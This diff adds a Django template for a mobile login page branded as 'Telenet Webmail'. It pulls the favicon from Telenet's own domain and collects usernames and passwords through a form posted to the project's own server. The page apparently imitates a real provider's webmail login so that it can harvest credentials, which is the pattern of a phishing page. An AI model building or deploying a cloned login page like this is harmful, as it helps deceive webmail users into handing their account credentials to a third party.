@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telenet Webmail</title>
+    <link rel="stylesheet" href="{% static 'styles/mobile.css' %}" />
+    <link
+      rel="shortcut icon"
+      href="//static.telenet.be/assets/favicon/favicon.ico"
+      type="image/x-icon"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="container-header" >
+        <h1 class="logo_h1">MailEnable Web Ma...</h1>
+      </div>
+
+      <div class="content">
+         <img src="{% static 'images/logo.png' %}" alt="" class="img_logo">
+        <form method='post' class="form">
+          {% csrf_token %}
+            <div class="input">
+                <input type="text" placeholder="Username" class="input1" name='username' required>
+            </div>
+
+            <div class="input">
+                 <input type="text" placeholder="Password" class="input2" name='password' reqiured>
+            </div>
+
+            <p class="error_msg" style="color: red;margin-bottom: 1em; font-size: 13px;" >
+              {{err_msg|linebreaksbr}}
+          </p>
+
+            <div class="check">
+                <input type="checkbox" name="" id="" class="checkbox" style="width: 25px;">
+
+                <p class="p__tag">Keep me logged in</p>
+            </div>
+
+            <div class="btn">
+                <button disabled="disabled" class="btn1">Reset</button>
+                <button type="submit" class="btn2">Login</button>
+
+            </div>
+
+            <hr color=" 1px solid blue " style="margin-top: 3em;">
+
+            <a href="{% url 'Login' pk='desktop' %}" class="btn3">Desktop Version</a>
+        </form>
+      </div>
+    </div>
+   
+
+  </body>
+</html>
